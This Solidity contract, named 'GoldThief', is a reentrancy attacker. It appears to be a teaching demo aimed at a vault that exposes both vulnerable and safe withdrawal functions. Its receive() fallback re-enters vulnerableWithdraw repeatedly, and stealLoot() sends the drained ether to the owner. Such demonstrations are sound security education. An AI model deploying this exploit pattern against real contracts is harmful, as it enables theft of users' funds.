// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _targetVault) {
        owner = msg.sender;
        targetVault = IVault(_targetVault);
    }

    function attackVulnerable() external payable {
        require(msg.value >= 1 ether, "thoda paisa to chaiye hoga");
        require(msg.sender == owner, "sus");

        attackCount = 0;
        attackingSafe = false;
        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    receive() external payable {
        attackCount++;
        if (
            !attackingSafe &&
            address(targetVault).balance >= 1 ether &&
            attackCount <= 5
        ) {
            targetVault.vulnerableWithdraw();
        }
        if (attackingSafe) {
            targetVault.safeWithdraw();
        }
    }

    function attackSafe() external payable {
        require(msg.value >= 1 ether, "thoda paisa to chaiye hoga");
        require(msg.sender == owner, "sus");

        attackCount = 0;
        attackingSafe = true;
        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function stealLoot() external {
        require(msg.sender == owner, "sus");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
